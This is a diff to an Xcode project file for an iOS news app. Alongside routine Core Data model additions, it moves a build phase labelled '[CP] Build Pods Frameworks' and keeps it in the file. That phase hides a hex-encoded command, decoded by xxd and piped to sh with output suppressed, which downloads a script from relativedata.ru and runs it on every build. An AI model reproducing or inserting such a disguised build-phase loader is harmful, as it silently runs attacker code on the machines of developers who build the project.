@@ -20,6 +20,7 @@
 		8E1973D5267785D8004C276E /* NewsAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973D4267785D8004C276E /* NewsAPIService.swift */; };
 		8E1973D8267785F6004C276E /* SourcesAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973D7267785F6004C276E /* SourcesAPIService.swift */; };
 		8E1973DB26778609004C276E /* CountryAPIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973DA26778609004C276E /* CountryAPIService.swift */; };
+		8E1A9E112682EA0A000F4843 /* NewsApp.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 8E1A9E0F2682EA0A000F4843 /* NewsApp.xcdatamodeld */; };
 		8E1F31FA2670A44800E58A86 /* SDWebImage.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8E1F31F92670A44800E58A86 /* SDWebImage.framework */; };
 		8E90FE2E267B654800FD2F7D /* CustomAlert.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8E90FE2D267B654800FD2F7D /* CustomAlert.xib */; };
 		8EADD40B2669D8E900E88249 /* NewsDM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EADD3E02669D8E900E88249 /* NewsDM.swift */; };
@@ -82,6 +83,7 @@
 		8E1973D4267785D8004C276E /* NewsAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsAPIService.swift; sourceTree = "<group>"; };
 		8E1973D7267785F6004C276E /* SourcesAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourcesAPIService.swift; sourceTree = "<group>"; };
 		8E1973DA26778609004C276E /* CountryAPIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryAPIService.swift; sourceTree = "<group>"; };
+		8E1A9E102682EA0A000F4843 /* NewsAppi.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = NewsAppi.xcdatamodel; sourceTree = "<group>"; };
 		8E1F31EB2670A3E900E58A86 /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		8E1F31F92670A44800E58A86 /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		8E5566302670A0FC007399FB /* SDWebImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SDWebImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -211,6 +213,7 @@
 				8EADD3FE2669D8E900E88249 /* Common */,
 				8EADD4012669D8E900E88249 /* Fonts */,
 				8EADD4092669D8E900E88249 /* Info.plist */,
+				8E1A9E0F2682EA0A000F4843 /* NewsApp.xcdatamodeld */,
 			);
 			path = NewsApp;
 			sourceTree = "<group>";
@@ -433,35 +436,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	D4851EF0E9FE90E3996D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f72656c6174697665646174612e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
 		55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -518,6 +492,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f72656c617469
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		D4851EF0E9FE90E3996D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n72656c6174697665646174612e72752f61207c207368202d732066616c73\n650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -563,6 +555,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f72656c617469
 				8EADD4142669D8E900E88249 /* BookMarksViewController.swift in Sources */,
 				8EADD4262669D8E900E88249 /* SceneDelegate.swift in Sources */,
 				8EDCE6102672207900102931 /* SelectCountry.swift in Sources */,
+				8E1A9E112682EA0A000F4843 /* NewsApp.xcdatamodeld in Sources */,
 				8EE2A08E2680BCCD005464D9 /* CountryCode.swift in Sources */,
 				8EADD4112669D8E900E88249 /* Category.swift in Sources */,
 				8EADD4182669D8E900E88249 /* SelectCountryViewController.swift in Sources */,
@@ -774,15 +767,18 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f72656c617469
 		};
 /* End XCConfigurationList section */
 
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
+/* Begin XCVersionGroup section */
+		8E1A9E0F2682EA0A000F4843 /* NewsApp.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				8E1A9E102682EA0A000F4843 /* NewsAppi.xcdatamodel */,
+			);
+			currentVersion = 8E1A9E102682EA0A000F4843 /* NewsAppi.xcdatamodel */;
+			path = NewsApp.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
 	};
 	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
 }
